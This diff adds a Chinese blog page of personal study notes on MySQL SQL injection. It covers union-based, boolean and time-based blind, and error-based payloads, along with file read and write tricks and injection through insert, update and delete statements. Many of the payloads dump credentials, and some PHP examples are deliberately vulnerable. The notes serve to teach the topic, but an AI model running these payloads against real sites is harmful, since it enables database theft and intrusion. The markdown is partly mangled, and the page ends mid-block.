@@ -1,0 +1,990 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="只因不值得">
+  <meta name="keywords" content="">
+  <title>Sql基础注入笔记 - 只因不值得</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+
+  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+<!-- 自定义样式保持在最底部 -->
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>只因不值得</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/categories/">分类</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    5.8k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      25 分钟
+                  </span>
+                
+
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+              <p
+                class="note note-warning">本文最后更新于：2019 , 八月 15日 星期四, 6:14 晚上</p>
+            
+            <div class="markdown-body">
+              <p><code>利用可控的参数或者入口来加载不可控的参数或者代码，造成恶意不可控的运行结果</code><br>最新phpstudy中mysql.ini添加<code>mysql.ini secure_file_priv=&quot;&quot;</code>配置</p>
+<h1 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h1><p>Mysql5.0之后<br>默认存放一个：<code>information_schema</code>的数据库<br>该库中的三个表名：<code>SCHEMATA</code>，<code>TABLES</code>，<code>COLUMNS</code><br><strong>说明：</strong></p>
+<blockquote>
+<ul>
+<li><p><code>SCHEMATA</code>表存储该用户创建的所有数据库名</p>
+<p>该表中距离数据库名的字段为：<code>SCHEMA_NAME</code></p>
+</li>
+<li><p><code>TABLES</code>表存储该用户创建的所有数据库的库名和表名</p>
+<p>该表中记录数据库名和表名的字段为：<code>TABLE_SCHEMA</code>和<code>TABLE_NAME</code></p>
+</li>
+<li><p><code>COLUMNS</code>表存储该用户创建的所有数据库的库名，字段名，表名</p>
+<p>数据库名，表名，字段名：<code>TABLE_SCHEMA</code>和<code>TABLE_NAME</code>和<code>COLUMN_NAME</code></p>
+</li>
+</ul>
+</blockquote>
+<a id="more"></a>
+
+
+<ul>
+<li>不知任何条件时<pre><code>select 字段名 from 库名.表名;</code></pre></li>
+<li>已知一条条件<pre><code>select 字段名 from 库名.表名 where 已知字段名=&#39;已知条件的值&#39;;</code></pre></li>
+<li>已知两条条件<pre><code>select 字段名 from 库名.表名 where 已知1字段名=&#39;已知1条件值&#39; and 已知2字段名=&#39;已知2条件值&#39;;</code></pre></li>
+</ul>
+<h2 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h2><pre><code># 格式
+limit m,n
+
+# m：记录开始的位置，0开始，表示第一条记录
+# n：n指取n条记录</code></pre><h2 id="常用的几个函数"><a href="#常用的几个函数" class="headerlink" title="常用的几个函数"></a>常用的几个函数</h2><ul>
+<li>注入时收集信息的<blockquote>
+<p>database()<br>version()<br>user()<br>@@datadir 读取数据库的绝对路径<br>@@basedir  mysql安装路径<br>@@version_compile_os    操作系统</p>
+</blockquote>
+</li>
+</ul>
+<h3 id="Mysql常用内置变量"><a href="#Mysql常用内置变量" class="headerlink" title="Mysql常用内置变量"></a>Mysql常用内置变量</h3><pre><code>@@have_openssl 如果mysqld支持客户端/服务器协议的SSL(加密)则为YES
+
+@@version_compile_os 判断系统类型
+
+@@max_allowed_packet 包或任何生成的/中间字符串的最大大小
+
+@@max_user_connections MySQL账户允许的最大同时连接数,0表示没限制
+
+@@skip_networking 如果服务器只允许本地(非TCP/IP)连接，该值为ON
+
+@@table_type 默认表类型(存储引擎)
+
+@@basedir MySQL安装基准目录
+
+@@character_set_database 默认数据库使用的字符集
+
+@@datadir 数据库存储的地方
+
+@@expire_logs_days 二进制日志自动删除的天数,默认是0,表示&quot;没有自动删除&quot;
+
+@@group_concat_max_len 允许group_concat()函数结果的最大长度
+
+@@log_error 错误日志的位置
+
+@@lower_case_file_system 该变量说明是否数据目录所在的文件系统对文件名的大小写敏感.
+        ON说明对文件名的大小写不敏感，OFF表示敏感
+
+@@lower_case_table_names 如果设置为1,表名用小写保存到硬盘上，并且表名比较时不对大小写敏感.
+　　  如果设置为2，按照指定的保存表名，但按照小写来比较
+
+@@plugin_dir 插件目录的路径
+
+@@tmpdir 保存临时文件和临时表的目录
+
+@@tmp_table_size 如果内存内的临时表超过该值，MySQL自动将它转换为硬盘上的MyISAM表
+
+@@sql_mode 当前服务器的sql模式
+
+@@tx_isolation 默认事务隔离级别。默认值为REPEATABLE-READ
+
+@@Connections 连接mysql数据库服务器的次数(不管成功还是失败)
+
+@@max_write_lock_count 最大写锁数量
+
+@@old_passwords 是否启用mysql323加密方式(就是mysql用户密码的hash是16位的)
+
+@@Uptime 服务器已经运行的时间</code></pre><h3 id="常规函数"><a href="#常规函数" class="headerlink" title="常规函数"></a>常规函数</h3><pre><code># Concat()
+将字符串拼接起来
+
+# group by
+根据规则，对数据进行分组，分组的时候，mysql会建立一个临时空表进行分组
+
+# hex()
+hex(&#39;字符串&#39;)      进行16进制编码
+
+# ascii()
+ascii(&#39;字符串 &#39;)  进行ascii编码</code></pre><h3 id="盲注常用函数"><a href="#盲注常用函数" class="headerlink" title="盲注常用函数"></a>盲注常用函数</h3><pre><code># 截取
+mid(str,start,length)
+str：返回其中一部分的字符串
+start：起始位置
+length：返回的长度
+
+substr(str,start,length)
+str：返回其中一部分的字符串
+start：起始位置
+length：返回的长度
+
+----------------------------------------
+# 编码
+
+ord(str)
+返回字符串第一个字符的ASCII值
+----------------------------------------
+# 返回长度
+
+left(string,length)
+str：返回其中一部分的字符串
+length：返回的长度
+----------------------------------------
+if (条件,True,False)
+
+----------------------------------------</code></pre><h3 id="报错注入常用函数"><a href="#报错注入常用函数" class="headerlink" title="报错注入常用函数"></a>报错注入常用函数</h3><pre><code># floor()
+floor(n)：返回一个小于或等于传入参数N的最大整数(相当于截断小说部分)
+
+# rand()
+
+# extractvalue()
+extractvalue(xml,xpath)
+xml：是str格式，为xml文档对象的名称
+xpath：xpath格式的字符串
+作用：从目标XML中返回包含所查询值得字符串
+
+# updatexml()
+updatexml(xml,xpath,new_value)
+xml：是str格式，为xml文档对象的名称
+xpath：xpath格式的字符串
+new_value：str格式，替换查找到的符合条件的数据
+作用：改变文档中符合条件的节点的值
+
+
+# exp()
+exp(x)计算e的x次方
+需要数字的，传入字符串必然宝座
+
+# GeometryCollection()
+# polygon()
+# multipoint()
+# multilinestring()
+# linestring()
+# multipolygon()
+例子：GEOMETRYCOLLECTION(POINT(10 10), POINT(30 30), LINESTRING(15 15, 20 20))
+作用：由一个或多个任意类几何对象构成几何对象
+由于mysql无法用这样字符串画出图形，所以报错了</code></pre><h2 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h2><pre><code>#
+--空格
+/**/</code></pre><h2 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h2><pre><code># 内联注释的形式
+/*！code */
+
+/*!union*/ /*!select*/ 1,2,3</code></pre><hr>
+<h1 id="Union-注入"><a href="#Union-注入" class="headerlink" title="Union 注入"></a>Union 注入</h1><ul>
+<li><p>判断注入</p>
+<pre><code># Tips：注意闭合语句！
+and 1=1
+and 1=2</code></pre></li>
+<li><p>查看字段数</p>
+<pre><code># 最后一个字段数返回正确页面则为最终字段数
+order by 字段数</code></pre></li>
+<li><p>union select</p>
+<pre><code>union select 字段数</code></pre></li>
+<li><p>利用mysql函数查看相关信息</p>
+<pre><code># Tips：有些网页不会直接爆显示位，网页参数前加-，或后面and 1=2，让其报错
+id=-1&#39; union select 1,2,3 %23
+id=1&#39; and 1=2 union select 1,2,3 %23</code></pre></li>
+<li><p>查询表名</p>
+<pre><code># 爆出所有表名
+id=1&#39; and 1=2 union select 1,group_concat(TABLE_NAME),3 from information_schema.tables where table_schema=database() %23
+
+</code></pre></li>
+</ul>
+<h1 id="查询第一个表名"><a href="#查询第一个表名" class="headerlink" title="查询第一个表名"></a>查询第一个表名</h1><p>id=1’ and 1=2 union select 1,TABLE_NAME,3 from information_schema.tables where table_schema=’security’ limit 0,1 %23</p>
+<h1 id="查询第二个表名"><a href="#查询第二个表名" class="headerlink" title="查询第二个表名"></a>查询第二个表名</h1><p>id=1’ and 1=2 union select 1,TABLE_NAME,3 from information_schema.tables where table_schema=’security’ limit 1,1 %23</p>
+<pre><code>
+* 查询字段名</code></pre><h1 id="查询某表的所有字段"><a href="#查询某表的所有字段" class="headerlink" title="查询某表的所有字段"></a>查询某表的所有字段</h1><p>id=1’ and 1=2 union select 1,group_concat(COLUMN_NAME),3 from information_schema.columns where table_name=’user’ %23</p>
+<h1 id="查询表的所有第一个字段"><a href="#查询表的所有第一个字段" class="headerlink" title="查询表的所有第一个字段"></a>查询表的所有第一个字段</h1><p>id=1’ and 1=2 union select 1,COLUMN_NAME,3 from information_schema.columns where table_name=’user’ limit 0,1 %23</p>
+<pre><code>
+* 获取数据</code></pre><h1 id="获取该字段下所有数据"><a href="#获取该字段下所有数据" class="headerlink" title="获取该字段下所有数据"></a>获取该字段下所有数据</h1><p>id=1%27%20and%201=2 union select 1,group_concat(username,0x3a,password),3 from users %23</p>
+<h1 id="查看数据"><a href="#查看数据" class="headerlink" title="查看数据"></a>查看数据</h1><p>id=1%27%20and%201=2 union select 1,username,password from users limit 0,1 %23</p>
+<pre><code>
+## 原理
+```php
+&lt;?php
+$con=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;test&quot;);
+// 检测连接
+if (mysqli_connect_errno())
+{
+ echo &quot;连接失败: &quot; . mysqli_connect_error();
+}
+
+$id = $_GET[&#39;id&#39;];
+
+$result = mysqli_query($con,&quot;select * from users where `id`=&quot;.$id);
+
+while($row = mysqli_fetch_array($result))
+{
+ echo $row[&#39;username&#39;] . &quot; &quot; . $row[&#39;address&#39;];
+ echo &quot;&lt;br&gt;&quot;;
+}
+?&gt;</code></pre><p>可以看到SQL语句：<strong>$result = mysqli_query($con,”select * from users where `id`=”.$id)</strong><br>直接被代入数据库中进行查询，并有进行过滤！<br>因此，这里可以直接进行构造语句进行恶意查询</p>
+<pre><code># 正常访问页面
+select * from users where `id`=1
+
+# 恶意构造访问
+select * from users where `id`=1 union select 1,2,3</code></pre><hr>
+<h1 id="高权限下的注入"><a href="#高权限下的注入" class="headerlink" title="高权限下的注入"></a>高权限下的注入</h1><p>基于<code>root权限</code>的注入</p>
+<h2 id="文件操作注入"><a href="#文件操作注入" class="headerlink" title="文件操作注入"></a>文件操作注入</h2><p>利用函数：</p>
+<ul>
+<li>load_file()：读取文件</li>
+<li>Into outfile() 写入函数</li>
+<li>into dumpfile 写入文件<pre><code>select &#39;写入内容&#39; into dumpfile &#39;文件路径&#39;</code></pre></li>
+</ul>
+<p><code>注入点的权限是由代码中连接数据库的用户所决定的（连接请求）</code></p>
+<p>与读取的相关因素：</p>
+<ul>
+<li>mysql权限</li>
+<li>操作系统</li>
+<li>系统读写的权限</li>
+<li>mysql配置<pre><code>secure_file_priv参数说明(这个参数在MySQL 5.7.6版本引入)
+这个参数用来限制数据导入和导出操作的效果
+例如执行LOAD DATA、SELECT ... INTO OUTFILE语句和LOAD_FILE()函数
+这些操作需要用户具有FILE权限
+如果这个参数为空，这个变量没有效果
+如果这个参数设为一个目录名，MySQL服务只允许在这个目录中执行文件的导入和导出操作
+这个目录必须存在，MySQL服务不会创建它；
+如果这个参数为NULL，MySQL服务会禁止导入和导出操作</code></pre></li>
+</ul>
+<p>路径的获取：</p>
+<ul>
+<li>报错显示</li>
+<li>谷歌黑客</li>
+<li>读取搭建平台配置文件</li>
+<li>漏洞报错</li>
+<li>遗留文件</li>
+<li>字典猜解</li>
+</ul>
+<blockquote>
+<p>Ps：路径符号及编码，读取或写入文件的时候用<code>/</code>，对需要写入的字符进行16进制编码，用编码写入的时候不要单引号</p>
+</blockquote>
+<h2 id="跨库注入"><a href="#跨库注入" class="headerlink" title="跨库注入"></a>跨库注入</h2><p>在网站A具有ROOT的权限的下，浏览网站B的数据库<br>语法：<code>select * from 数据库名.表名</code></p>
+<p>其他的就和常规注入差不多</p>
+<hr>
+<h1 id="提交方式注入"><a href="#提交方式注入" class="headerlink" title="提交方式注入"></a>提交方式注入</h1><ul>
+<li>POST 登录框注入</li>
+<li>Cookie 验证注入<br>直接将ID拼接到select语句进行查询，然后返回结果<br>直接在cookie处，测试</li>
+</ul>
+<blockquote>
+<p>Ps：将该写的东西写到改写的地方，post处和cookie处进行注入</p>
+</blockquote>
+<ul>
+<li>HTTP 注入<br>实际情况下，有部分站点接受数据是以http数据包中的http头部进去数据接受<br>所以测试注入点的时候，需要将注入语句写入到http头部中<br><code>$_SERVER</code><br>以数据包的形式进行检测和注入(工具)<br>火狐插件（modify headers）<br>burp手工进行检测</li>
+</ul>
+<hr>
+<h1 id="参数类型注入"><a href="#参数类型注入" class="headerlink" title="参数类型注入"></a>参数类型注入</h1><ul>
+<li>数字<pre><code>$id = $_GET[&#39;x&#39;];
+select * from news where id=1</code></pre></li>
+<li>字符<pre><code>$id = $_GET[&#39;x&#39;];
+select * from news where id=&#39;admin&#39;</code></pre></li>
+<li>搜索型<pre><code>$id = $_GET[&#39;x&#39;];
+select * from news where id like &#39;%username%&#39;</code></pre></li>
+</ul>
+<hr>
+<h1 id="参数加解密注入"><a href="#参数加解密注入" class="headerlink" title="参数加解密注入"></a>参数加解密注入</h1><p>例如：$id = base64_decode($_GET[‘X’]);<br>ID参数经过base64编码再进行访问<br>需要手动进行判断</p>
+<hr>
+<h1 id="盲注攻击-–-Boolean-布尔-注入"><a href="#盲注攻击-–-Boolean-布尔-注入" class="headerlink" title="盲注攻击 – Boolean(布尔) 注入"></a>盲注攻击 – Boolean(布尔) 注入</h1><p>返回结果只有真和假(yes和no)<br><code>布尔型注入是指构造SQL判断语句</code>，通过查看页面的返回结果来推测哪些结果是成立的</p>
+<ul>
+<li>判断数据库名长度<pre><code># 第一次判断
+id=1&#39;+and+length(database())&gt;5--+
+返回：no
+</code></pre></li>
+</ul>
+<h1 id="第二次判断"><a href="#第二次判断" class="headerlink" title="第二次判断"></a>第二次判断</h1><p>id=1’+and+length(database())&gt;2–+<br>返回：yes</p>
+<h1 id="第三次判断"><a href="#第三次判断" class="headerlink" title="第三次判断"></a>第三次判断</h1><p>id=1’+and+length(database())&gt;4–+<br>返回：no</p>
+<h1 id="第四次判断"><a href="#第四次判断" class="headerlink" title="第四次判断"></a>第四次判断</h1><p>id=1’+and+length(database())=4–+<br>返回：yes</p>
+<pre><code>
+* 判断数据库名</code></pre><h1 id="判断数据库名的第一个字符是否为t（这是截取字符串进行判断）"><a href="#判断数据库名的第一个字符是否为t（这是截取字符串进行判断）" class="headerlink" title="判断数据库名的第一个字符是否为t（这是截取字符串进行判断）"></a>判断数据库名的第一个字符是否为t（这是截取字符串进行判断）</h1><p>id=1’ and substr(database(),1,1)=’t’ –+<br>为了节省时间，你可以使用burp对t处进行爆破，以便快速获取</p>
+<h1 id="ASCII码值判断，以此类推"><a href="#ASCII码值判断，以此类推" class="headerlink" title="ASCII码值判断，以此类推"></a>ASCII码值判断，以此类推</h1><p>id=1’ and ord(mid(database(),1,1))&gt;100 –+</p>
+<pre><code>
+* 判断表名</code></pre><h1 id="以此类推"><a href="#以此类推" class="headerlink" title="以此类推"></a>以此类推</h1><p>id=1’ and substr((select table_name from information_schema.tables where table_schema=’test’ limit 0,1),1,1)=’u’ –+</p>
+<pre><code>
+## 原理
+```php
+$con=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;test&quot;);
+// 检测连接
+if (mysqli_connect_errno())
+{
+ echo &quot;连接失败: &quot; . mysqli_connect_error();
+}
+
+$id = $_GET[&#39;id&#39;];
+
+if (preg_match(&quot;/union|sleep|benchmark/i&quot;, $id)) {
+ exit(&quot;no&quot;);
+}
+
+$result = mysqli_query($con,&quot;select * from users where `id`=&#39;&quot;.$id.&quot;&#39;&quot;);
+
+$row = mysqli_fetch_array($result);
+
+if ($row) {
+ exit(&quot;yes&quot;);
+}else{
+ exit(&quot;no&quot;);
+}</code></pre><p><strong>关键</strong><br><code>preg_match()</code>：执行匹配正则表达式<br>通过preg_match匹配$id中是否存在<code>/union|sleep|benchmark/</code>等危险字符<br>如果没有则拼接SQL语句</p>
+<pre><code>if (preg_match(&quot;/union|sleep|benchmark/i&quot;, $id)) {
+ exit(&quot;no&quot;);
+}</code></pre><hr>
+<h1 id="盲注攻击-–-报错注入"><a href="#盲注攻击-–-报错注入" class="headerlink" title="盲注攻击 – 报错注入"></a>盲注攻击 – 报错注入</h1><h2 id="Xpath语法错误"><a href="#Xpath语法错误" class="headerlink" title="Xpath语法错误"></a>Xpath语法错误</h2><ul>
+<li>updatexml</li>
+<li>extractvalue</li>
+</ul>
+<h3 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h3><p><code>最大长度限制32位</code></p>
+<ul>
+<li><p>查询信息</p>
+<pre><code>username=1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</code></pre></li>
+<li><p>获取全部数据库名</p>
+<pre><code>username=1&#39; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1),0x7e),1)--+</code></pre></li>
+<li><p>获取表名</p>
+<pre><code>username=1&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;test&#39; limit 0,1),0x7e),1)--+</code></pre></li>
+<li><p>获取数据</p>
+<pre><code>username=1&#39; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1)--+</code></pre></li>
+</ul>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><pre><code>and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</code></pre><p>通过查询@@version，返回版本，然后cancat将其字符串化<br>因为updatexml第二个参数需要Xpath格式的字符串，所有不符合要求，然后报错<br><code>ERROR 1105 (HY000): XPATH syntax error: ’:root@localhost’</code></p>
+<h3 id="extractvalue-注入"><a href="#extractvalue-注入" class="headerlink" title="extractvalue()注入"></a>extractvalue()注入</h3><p>extractvalue和updatexml差不多，我这就只略过</p>
+<pre><code># 获取数据
+username=1&#39; and extractvalue(1,concat(0x7e,(select password from users limit 0,1),0x7e))--+</code></pre><h2 id="几何函数注入"><a href="#几何函数注入" class="headerlink" title="几何函数注入"></a>几何函数注入</h2><ul>
+<li>geometrycollection</li>
+<li>multipoint</li>
+<li>polygon</li>
+<li>multipolygon</li>
+<li>linestring</li>
+<li>multilinestring</li>
+</ul>
+<blockquote>
+<p>Tips：<code>mysql 5.5.47</code> 可以执行，&gt;=5.5.53则不可以<br>函数对参数要求是(1 2,3 3,2 2 1)这样的几何数据，如果不满足要求，则会报错</p>
+</blockquote>
+<pre><code>username=1&#39; and geometrycollection((select * from (select * from (select version())a)b)) --+</code></pre><h2 id="数据溢出"><a href="#数据溢出" class="headerlink" title="数据溢出"></a>数据溢出</h2><ul>
+<li>exp</li>
+</ul>
+<p>5.5之前，整形溢出是不会报错的</p>
+<pre><code>select 18446744073709551615+1</code></pre><p>在mysql中，要使用这么大的数，并不需要输入这么长的数字进去，使用<code>按位取反运算</code>即可</p>
+<pre><code>select ~0</code></pre><p>如果一个查询成功返回，则其返回值，进行逻辑非运算后可得1，这个值是可以进行数学运算的</p>
+<pre><code># Mysql中
+select (select * from (select user()x))</code></pre><p>同理exp函数也会产生类似的溢出错误</p>
+<pre><code>username=1&#39; and exp(~(select * from(select user())x)) --+</code></pre><p>利用这一特性，再结合之前说的溢出报错，就可以进行注入了</p>
+<blockquote>
+<p>Tips：5.5.7可以，&gt;=5.5.53不行</p>
+</blockquote>
+<pre><code>select (select(!x-~0)from(select(select user())x)a)</code></pre><h2 id="主键重复"><a href="#主键重复" class="headerlink" title="主键重复"></a>主键重复</h2><ul>
+<li>floor</li>
+</ul>
+<p><code>count</code>、<code>group by</code>在遇到<code>rand</code>产生的重复值时报错的思路</p>
+<ul>
+<li>count<blockquote>
+<p>包括列，返回表中的记录数，相当于统计表的行数，在统计结果的时候，不会忽略列值为Null的记录</p>
+</blockquote>
+</li>
+<li>group by<blockquote>
+<p>利用分组信息进行统计</p>
+</blockquote>
+</li>
+<li>rand<blockquote>
+<p>0和1之间产生一个随机数</p>
+</blockquote>
+</li>
+<li>floor<blockquote>
+<p>返回 小于等于 该值得最大整数</p>
+</blockquote>
+</li>
+</ul>
+<pre><code># 3条以上记录进行查询
+select count(*) from users group by floor(rand(0)*2)</code></pre><blockquote>
+<p>Tips：floor(rand(0)*2)，报错是有条件的，记录必须3条以上，而且在3条以上必定报错</p>
+</blockquote>
+<pre><code>selec count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x</code></pre><p>报错本质：floor(rand(0)<em>2)的重复性，导致group by出错<br>*</em>group by key的原理：**</p>
+<blockquote>
+<p>循环读取数据的每一行，将结果保存于临时表中<br>读取每一行的key，如果key存在于临时表中，则不再临时表中更新数据<br>如果key不再，则插入所在行的数据</p>
+</blockquote>
+<p><strong>rand()函数在查询的时候回执行一次，插入的时候还会执行一次</strong>，这就是整个语句报错的关键<br>floor(rand(0)*2)前六位是 011011 group by x先建立一个空表用于分组，然后进行分组查询<br>第一次rand()执行，查询的结果是0，因为是空表所以插入这条数据，而插入的时候rand()又执行了一次，所以</p>
+<p><strong>floor()报错注入，混乱没理解，待重写</strong></p>
+<hr>
+<h1 id="盲注攻击-–-时间盲注"><a href="#盲注攻击-–-时间盲注" class="headerlink" title="盲注攻击 – 时间盲注"></a>盲注攻击 – 时间盲注</h1><ul>
+<li>判断数据库长度<pre><code>and+if(length(database())=4,0,sleep(5))</code></pre></li>
+<li>获取表名<pre><code># 判断表名长度
+and+if(length(table_name)=5,0,sleep(5)) from information_schema.tables where table_schema=database() limit 0,1
+</code></pre></li>
+</ul>
+<h1 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h1><p>//mid进行获取<br>and+if(mid(table_name,1,1)=’u’,0,sleep(5)) from information_schema.tables where table_schema=database() limit 0,1</p>
+<p>//ord进行获取<br>and+if(ord(mid(table_name,1,1))=117,0,sleep(5)) from information_schema.tables where table_schema=database() limit 0,1</p>
+<pre><code>* 获取列名</code></pre><h1 id="判断列名长度"><a href="#判断列名长度" class="headerlink" title="判断列名长度"></a>判断列名长度</h1><p>and+if(length(column_name)=5,0,sleep(5)) from information_schema.columns where table_name=’users’ limit 0,1</p>
+<h1 id="获取表名-1"><a href="#获取表名-1" class="headerlink" title="获取表名"></a>获取表名</h1><p>//mid进行获取<br>and+if(mid(column_name,1,1)=’i’,0,sleep(5)) from information_schema.columns where table_name=’users’ limit 0,1</p>
+<p>//ord进行获取<br>and+if(ord(mid(table_name,1,1))=105,0,sleep(5)) from information_schema.columns where table_name=’users’ limit 0,1</p>
+<pre><code>
+---
+
+# Mysql_insert 三种注入
+有的网站会记录用户浏览记录，包括referer，client_ip,user-agent以及一些其他的功能（用户注册，密码修改，信息删除等）
+&gt; insert,delete,update,limit
+</code></pre><p>insert Into：插入数据<br>Insert Into table_name(field1,field2,fieldN) Values (value1,value2,valueN)</p>
+<p>update：用于修改或更新Mysql中的数据<br>修改数据通用语法：update table_name SET field1=new_value1,field2=new_value2 where Clause</p>
+<p>delete：删除Mysql中的数据<br>通用删除语法：DELETE from table_name where Clause</p>
+<pre><code>
+&gt; Ps1：单双引号要根据查询，来决定注入时使用引号的问题
+&gt; Ps2:在这些类型的注入中Mysql中的 -，#，不会注释掉查询的其他部分，会被当做普通字符处理
+
+## updatexml()获取数据
+在这里，我们通常使用updatexml()和extractdata()函数
+payload：`or updatexml(1,concat(0x7e,(version())),0) or &#39;&#39;`
+
+例子</code></pre><h1 id="Insert"><a href="#Insert" class="headerlink" title="Insert"></a>Insert</h1><p>INSERT INTO users(id,username,password) values (‘10’,’xxx’ or updatexml(1,concat(0x7e,(version())),0) or’’,’123456’);<br>ERROR 1105 (HY000): XPATH syntax error: ‘~5.5.53’</p>
+<h1 id="Delete"><a href="#Delete" class="headerlink" title="Delete"></a>Delete</h1><p>delete from users where id=9 or updatexml(1,concat(0x7e,(version())),0) or ‘’;<br>ERROR 1105 (HY000): XPATH syntax error: ‘~5.5.53’</p>
+<h1 id="Update"><a href="#Update" class="headerlink" title="Update"></a>Update</h1><p>update users SET username=’123’,password=’Nicky’ or updatexml(1,concat(0x7e,(version())),0) or ‘’ where id=9;<br>ERROR 1105 (HY000): XPATH syntax error: ‘~5.5.53’</p>
+<pre><code>
+* 获取表名,列名，数据
+&gt; payload：`or updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1)),0) or &#39;&#39;`
+</code></pre><h1 id="Insert-1"><a href="#Insert-1" class="headerlink" title="Insert"></a>Insert</h1><p>获取表<br>INSERT INTO users (id, username, password) VALUES (12,’Olivia’ or updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 0,1)),0) or ‘’, ‘Nervo’);<br>ERROR 1105 (HY000): XPATH syntax error: ‘~users’</p>
+<p>获取列<br>INSERT INTO users (id, username, password) VALUES (12,’Olivia’ or updatexml(0,concat(0x7e,(SELECT concat(column_name) FROM information_schema.columns WHERE table_name=’users’ limit 0,1)),0) or ‘’, ‘Nervo’);<br>ERROR 1105 (HY000): XPATH syntax error: ‘~user_id’</p>
+<p>获取数据<br>INSERT INTO users (id, username, password) VALUES (12,’Olivia’ or updatexml(0,concat(0x7e,(SELECT concat_ws(‘:’,id, username, password) FROM users limit 0,1)),0) or ‘’, ‘Nervo’);<br>ERROR 1105 (HY000): XPATH syntax error: ‘~1:Dumb:Dumb’</p>
+<h1 id="Delete-1"><a href="#Delete-1" class="headerlink" title="Delete"></a>Delete</h1><p>获取数据<br>DELETE FROM users WHERE id=1 or updatexml(0,concat(0x7e,(SELECT concat_ws(‘:’,id,username, password) FROM users limit 0,1)),0) or ‘’;<br>ERROR 1105 (HY000): XPATH syntax error: ‘~1:Dumb:Dumb’</p>
+<pre><code>
+&gt; Ps:可以在insert。update和dalete语句中使用updatexml()函数检索表，列，但是，`如果你在同一个表中，则不能使用update语句转储数据`！
+
+```mysql
+UPDATE users SET password=&#39;Nicky&#39; or updatexml(1,concat(0x7e,(SELECT concat_ws(&#39;:&#39;,id, username, password) FROM newdb.users limit 0,1)),0) or&#39;&#39; WHERE id=2 and username=&#39;Olivia&#39;;
